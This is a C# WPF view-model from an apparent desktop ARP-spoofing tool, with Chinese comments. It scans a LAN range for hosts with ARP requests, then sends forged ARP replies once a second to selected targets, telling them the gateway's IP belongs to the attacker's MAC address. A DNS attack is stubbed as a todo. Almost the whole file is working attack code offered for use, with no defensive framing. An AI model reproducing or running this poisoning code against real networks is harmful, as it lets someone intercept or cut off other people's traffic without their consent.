using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace ARPSpoofing
{
    public class MainWindowViewModel : ObservableObject
    {
        private readonly TimeSpan _timeout = new TimeSpan(0, 0, 2);
        private Task _scanTask = null;
        private CancellationTokenSource _cancellationTokenSource; //取消scan的token

        /// <summary>
        /// 所有的网卡设备集合
        /// </summary>
        private ObservableCollection<LibPcapLiveDevice> _libPcapLiveDevices;
        public ObservableCollection<LibPcapLiveDevice> LibPcapLiveDevices
        {
            get { return _libPcapLiveDevices; }
            set { SetProperty(ref _libPcapLiveDevices, value); }
        }

        // <summary>
        /// 局域网主机
        /// </summary>
        private ObservableCollection<Computer> _computers;
        public ObservableCollection<Computer> Computers
        {
            get { return _computers; }
            set { SetProperty(ref _computers, value); }
        }

        /// <summary>
        /// 所有的被arp攻击主机集合
        /// </summary>
        private ObservableCollection<ArpAttackComputer> _arpAttackComputers;
        public ObservableCollection<ArpAttackComputer> ArpAttackComputers
        {
            get { return _arpAttackComputers; }
            set { SetProperty(ref _arpAttackComputers, value); }

        }

        /// <summary>
        /// 当前选中的网卡设备
        /// </summary>
        private LibPcapLiveDevice _libPcapLiveDevice;
        public LibPcapLiveDevice LibPcapLiveDevice
        {
            get { return _libPcapLiveDevice; }
            set { SetProperty(ref _libPcapLiveDevice, value); }
        }

        /// <summary>
        /// 本机ip
        /// </summary>
        private IPAddress _localIp;
        public IPAddress LocalIp
        {
            get { return _localIp; }
            set { SetProperty(ref _localIp, value); LocalIpText = value?.ToString(); }
        }

        /// <summary>
        /// 本机mac地址
        /// </summary>
        private PhysicalAddress _localMac;
        public PhysicalAddress LocalMac
        {
            get { return _localMac; }
            set { SetProperty(ref _localMac, value); LocalMacText = value?.ToString(); }
        }

        /// <summary>
        /// 网关ip
        /// </summary>
        private IPAddress _gatewayIp;
        public IPAddress GatewayIp
        {
            get { return _gatewayIp; }
            set { SetProperty(ref _gatewayIp, value); GatewayIpText = value?.ToString(); }
        }

        /// <summary>
        /// 网关mac地址
        /// </summary>
        private PhysicalAddress _gatewayMac;
        public PhysicalAddress GatewayMac
        {
            get { return _gatewayMac; }
            set { SetProperty(ref _gatewayMac, value); GatewayMacText = value?.ToString(); }
        }

        private string _localIpText;
        public string LocalIpText
        {
            get { return _localIpText; }
            set { SetProperty(ref _localIpText, value); }
        }

        private string _localMacText;
        public string LocalMacText
        {
            get { return _localMacText; }
            set { SetProperty(ref _localMacText, value); }
        }

        private string _gatewayIpText;
        public string GatewayIpText
        {
            get { return _gatewayIpText; }
            set { SetProperty(ref _gatewayIpText, value); }
        }

        private string _gatewayMacText;
        public string GatewayMacText
        {
            get { return _gatewayMacText; }
            set { SetProperty(ref _gatewayMacText, value); }
        }

        /// <summary>
        /// 起始ip
        /// </summary>
        private string _startIpAddress;
        public string StartIpAddress
        {
            get { return _startIpAddress; }
            set { SetProperty(ref _startIpAddress, value); }
        }

        /// <summary>
        /// 终点ip
        /// </summary>
        private string _endIpAddress;
        public string EndIpAddress
        {
            get { return _endIpAddress; }
            set { SetProperty(ref _endIpAddress, value); }
        }

        private bool _isScanning;
        public bool IsScanning
        {
            get { return _isScanning; }
            set { SetProperty(ref _isScanning, value); }
        }

        /// <summary>
        /// 是否正在攻击
        /// </summary>
        private bool _isAttacking;
        public bool IsAttacking
        {
            get { return _isAttacking; }
            set { SetProperty(ref _isAttacking, value); }
        }

        public RelayCommand LoadedCommand { get; set; }
        public RelayCommand ShiftDeviceCommand { get; set; }
        public AsyncRelayCommand ScanCommand { get; set; }
        public RelayCommand StopScanCommand { get; set; }
        public RelayCommand CallTargetComputerCommand { get; set; } //攻击目标主机
        public RelayCommand StopCallTargetComputerCommand { get; set; }

        public MainWindowViewModel()
        {
            IsScanning = false;
            IsAttacking = false;
            LoadedCommand = new RelayCommand(Loaded);
            ShiftDeviceCommand = new RelayCommand(ShiftDevice);
            ScanCommand = new AsyncRelayCommand(ScanAsync);
            StopScanCommand = new RelayCommand(StopScan);
            CallTargetComputerCommand = new RelayCommand(CallTargetComputer);
            StopCallTargetComputerCommand = new RelayCommand(StopCallTargetComputer);
            _cancellationTokenSource = new CancellationTokenSource();
            ArpAttackComputers = new ObservableCollection<ArpAttackComputer>();
        }

        /// <summary>
        /// 加载页面触发事件
        /// </summary>
        private void Loaded()
        {
            LibPcapLiveDevices = new ObservableCollection<LibPcapLiveDevice>(LibPcapLiveDeviceList.Instance);
            if (LibPcapLiveDevices.Count < 0)
            {
                LibPcapLiveDevice = null;
                MessageBox.Show("网卡数量不足", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            LibPcapLiveDevice = LibPcapLiveDevices.FirstOrDefault();
            ShiftDevice();
            LoopforScanningStatus();//轮询scan的task状态
        }

        /// <summary>
        /// 切换网卡事件
        /// </summary>
        private void ShiftDevice()
        {
            if (LibPcapLiveDevice == null)
                return;

            LocalIp = null;
            LocalMac = null;
            GatewayIp = null;
            GatewayMac = null;
            foreach (var address in LibPcapLiveDevice.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.AF_INET_AF_INET6)
                {
                    //ipv4地址
                    if (address.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        LocalIp = address.Addr.ipAddress;
                        break;
                    }
                }
            }

            foreach (var address in LibPcapLiveDevice.Addresses)
            {
                if (address.Addr.type == Sockaddr.AddressTypes.HARDWARE)
                {
                    LocalMac = address.Addr.hardwareAddress; // 本机MAC
                }
            }

            var gw = LibPcapLiveDevice.Interface.GatewayAddresses; // 网关IP
            //ipv4的gateway
            GatewayIp = gw?.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork);
            if (GatewayIp == null)
                return;

            StartIpAddress = GatewayIp.ToString();
            EndIpAddress = GatewayIp.ToString();
            GatewayMac = Resolve(GatewayIp);
        }

        /// <summary>
        /// 扫描局域网
        /// </summary>
        private async Task ScanAsync()
        {
            IPAddress startIP, endIP;
            if (!IPAddress.TryParse(StartIpAddress, out startIP) || !IPAddress.TryParse(EndIpAddress, out endIP))
            {
                MessageBox.Show("不合法的IP地址");
                return;
            }

            IPObject start = new IPObject(startIP);
            IPObject end = new IPObject(endIP);
            if (!start.SmallerThan(end))
            {
                MessageBox.Show("起始地址大于结束地址");
                return;
            }

            await ScanLanAsync(start, end);
        }

        private void StopScan()
        {
            _cancellationTokenSource?.Cancel();
        }

        private void LoopforScanningStatus()
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    //如果scantask已完成，则IsScanning = false;
                    if ((_scanTask == null || _scanTask.IsCanceled || _scanTask.IsCompleted) && IsScanning)
                    {
                        Application.Current.Dispatcher.Invoke(() => IsScanning = false);
                    }

                    ////如果attacktasks已完成，则IsScanning = false;
                    //if ((_attackTasks == null || _attackTasks.Count <= 0 || _attackTasks.All(x => x.IsCanceled)
                    //        || _attackTasks.All(x => x.IsCompleted)) && IsAttacking)
                    //{
                    //    _attackTasks?.Clear();
                    //    _cancellationTokenSource1 = new CancellationTokenSource();
                    //    Application.Current.Dispatcher.Invoke(() => IsAttacking = false);
                    //}

                    await Task.Delay(500);
                }
            });
        }

        /// <summary>
        /// 获取ip的mac地址
        /// </summary>
        /// <param name="destIP"></param>
        /// <returns></returns>
        public PhysicalAddress Resolve(IPAddress destIP)
        {
            var request = BuildRequest(destIP, LocalMac, LocalIp);
            string arpFilter = "arp and ether dst " + LocalMac.ToString();
            LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
            LibPcapLiveDevice.Filter = arpFilter;
            var lastRequestTime = DateTime.FromBinary(0);
            var requestInterval = TimeSpan.FromMilliseconds(200);

            ArpPacket arpPacket = null;
            var timeoutDateTime = DateTime.Now + _timeout;
            while (DateTime.Now < timeoutDateTime)
            {
                if (requestInterval < (DateTime.Now - lastRequestTime))
                {
                    LibPcapLiveDevice.SendPacket(request);
                    lastRequestTime = DateTime.Now;
                }

                if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0)
                {
                    if (packet.Device.LinkType != LinkLayers.Ethernet)
                    {
                        continue;
                    }
                    var pack = Packet.ParsePacket(packet.Device.LinkType, packet.Data.ToArray());
                    arpPacket = pack.Extract<ArpPacket>();
                    if (arpPacket == null)//是否是一个arp包
                    {
                        continue;
                    }

                    if (arpPacket.SenderProtocolAddress.Equals(destIP))
                    {
                        break;
                    }
                }
            }

            // free the device
            LibPcapLiveDevice.Close();
            return arpPacket?.SenderHardwareAddress;
        }

        /// <summary>
        /// 扫描局域网的主机
        /// </summary>
        /// <param name="startIP">起始ip</param>
        /// <param name="endIP">终点ip</param>
        public async Task ScanLanAsync(IPObject startIP, IPObject endIP)
        {
            var targetIPList = new List<IPAddress>();
            Computers = new ObservableCollection<Computer>();
            while (!startIP.Equals(endIP))
            {
                targetIPList.Add(startIP.IPAddress);
                startIP.AddOne();
            }
            var arpPackets = new Packet[targetIPList.Count];
            for (int i = 0; i < arpPackets.Length; ++i)
            {
                arpPackets[i] = BuildRequest(targetIPList[i], LocalMac, LocalIp);
            }
            string arpFilter = "arp and ether dst " + LocalMac.ToString();
            //open the device with 20ms timeout
            LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
            LibPcapLiveDevice.Filter = arpFilter;
            IsScanning = true;
            _scanTask = Task.Run(() =>
            {
                for (int i = 0; i < arpPackets.Length; ++i)
                {
                    if (_cancellationTokenSource.IsCancellationRequested)
                    {
                        break;
                    }
                    var lastRequestTime = DateTime.FromBinary(0);
                    var requestInterval = TimeSpan.FromMilliseconds(200);
                    var timeoutDateTime = DateTime.Now + _timeout;
                    while (DateTime.Now < timeoutDateTime)
                    {
                        if (_cancellationTokenSource.IsCancellationRequested)
                        {
                            break;
                        }

                        if (requestInterval < (DateTime.Now - lastRequestTime))
                        {
                            LibPcapLiveDevice.SendPacket(arpPackets[i]);
                            lastRequestTime = DateTime.Now;
                        }

                        if (LibPcapLiveDevice.GetNextPacket(out var packet) > 0)
                        {
                            if (packet.Device.LinkType != LinkLayers.Ethernet)
                            {
                                continue;
                            }
                            var pack = Packet.ParsePacket(packet.Device.LinkType, packet.Data.ToArray());
                            var arpPacket = pack.Extract<ArpPacket>();
                            if (arpPacket == null)
                            {
                                continue;
                            }

                            //回复的arp包并且是我们请求的ip地址
                            if (arpPacket.SenderProtocolAddress.Equals(targetIPList[i]))
                            {
                                Application.Current.Dispatcher.Invoke(() =>
                                {
                                    ///增加到IPlist中
                                    Computers.Add(new Computer()
                                    {
                                        IPAddress = arpPacket.SenderProtocolAddress.ToString(),
                                        MacAddress = arpPacket.SenderHardwareAddress?.ToString(),
                                    });
                                });

                                break;
                            }
                        }
                    }
                }

                LibPcapLiveDevice.Close();
                Application.Current.Dispatcher.Invoke(() =>
                {
                    MessageBox.Show("扫描完成");
                    _cancellationTokenSource = new CancellationTokenSource();
                });
            }, _cancellationTokenSource.Token);

            await _scanTask;
        }

        private void CallTargetComputer()
        {
            if (Computers == null || Computers.All(x => !x.IsSelected))
            {
                MessageBox.Show("没有合适的目标攻击主机");
                return;
            }

            var target = Computers.Where(x => x.IsSelected);
            if (target.Count() <= 0)
                return;

            IsAttacking = true;
            if (!LibPcapLiveDevice.Opened)
                LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
            foreach (var compute in target)
            {
                var packet = BuildResponse(IPAddress.Parse(compute.IPAddress), PhysicalAddress.Parse(compute.MacAddress), GatewayIp, LocalMac);
                var attackComputer = new ArpAttackComputer()
                {
                    IPAddress = compute.IPAddress,
                    MacAddress = compute.MacAddress,
                };

                attackComputer.ArpAttackTask = Task.Run(async () =>
                {
                    while (true)
                    {
                        if (attackComputer.CancellationTokenSource.IsCancellationRequested)
                        {
                            break;
                        }
                        try
                        {
                            LibPcapLiveDevice.SendPacket(packet);
                            if (!attackComputer.Succeed) 
                            {
                                attackComputer.Succeed = true;
                            }
                        }
                        catch (Exception ex)
                        {
                            attackComputer.Succeed = false;
                            //MessageBox.Show(ex.Message);
                        }

                        await Task.Delay(1000);
                    }
                }, attackComputer.CancellationTokenSource.Token);

                attackComputer.DnsAttackTask = Task.Run(() =>
                {
                    //Todo dns attack
                });

                ArpAttackComputers.Add(attackComputer);
            }
        }

        /// <summary>
        /// 停止攻击主机
        /// </summary>
        private void StopCallTargetComputer() 
        {
            var targets = ArpAttackComputers.Where(x => x.IsSelected).ToList();
            foreach (var item in targets) 
            {
                item.CancelTask();
                ArpAttackComputers.Remove(item);
            }
        }

        /// <summary>
        /// 构建arp请求
        /// </summary>
        /// <param name="destinationIP">目标地址</param>
        /// <param name="localMac">本地mac地址</param>
        /// <param name="localIP">本地ip地址</param>
        /// <returns></returns>
        private Packet BuildRequest(IPAddress destinationIP, PhysicalAddress localMac, IPAddress localIP)
        {
            var ethernetPacket = new EthernetPacket(localMac, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.Arp);
            var arpPacket = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), destinationIP, localMac, localIP);
            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        /// <summary>
        /// 构建arp响应
        /// </summary>
        /// <param name="destIP">目标ip</param>
        /// <param name="destMac">目标mac地址</param>
        /// <param name="senderIP">发送人ip</param>
        /// <param name="senderMac">发送人mac地址</param>
        /// <returns></returns>
        private Packet BuildResponse(IPAddress destIP, PhysicalAddress destMac, IPAddress senderIP, PhysicalAddress senderMac)
        {
            var ethernetPacket = new EthernetPacket(senderMac, destMac, EthernetType.Arp);
            var arpPacket = new ArpPacket(ArpOperation.Response, destMac, destIP, senderMac, senderIP);
            ethernetPacket.PayloadPacket = arpPacket;
            return ethernetPacket;
        }
    }

    /// <summary>
    /// 局域网内的主机列表元素
    /// </summary>
    public class Computer
    {
        public string IPAddress { get; set; }
        public string MacAddress { get; set; }
        public bool IsSelected { get; set; }
    }

    /// <summary>
    /// 局域网内被arp攻击的主机列表元素
    /// </summary>
    public class ArpAttackComputer : ObservableObject
    {
        public bool Succeed { get; set; } //是否攻击成功
        public string IPAddress { get; set; }
        public string MacAddress { get; set; }
        public bool IsSelected { get; set; }
        public Task ArpAttackTask { get; set; }
        public Task DnsAttackTask { get; set; } //todo define dns attack
        public CancellationTokenSource CancellationTokenSource { get; set; }

        private double _value;
        public double Value
        {
            get => _value;
            set => SetProperty(ref _value, value);
        }

        public ArpAttackComputer()
        {
            CancellationTokenSource = new CancellationTokenSource();
            Task.Run(async () =>
            {
                while (true) 
                {
                    if (Succeed)
                    {
                        await Task.Delay(500);
                        Application.Current.Dispatcher.Invoke(() =>
                        {
                            Value += 33;
                            if (Value > 100)
                                Value = 0;
                        });
                    }
                }
            });
        }

        /// <summary>
        /// 发送arp诈骗
        /// </summary>
        internal void SendArpSpoofing() 
        {
            ArpAttackTask?.Start();
        }

        internal void CancelTask() 
        {
            CancellationTokenSource?.Cancel();
        }
    }
}
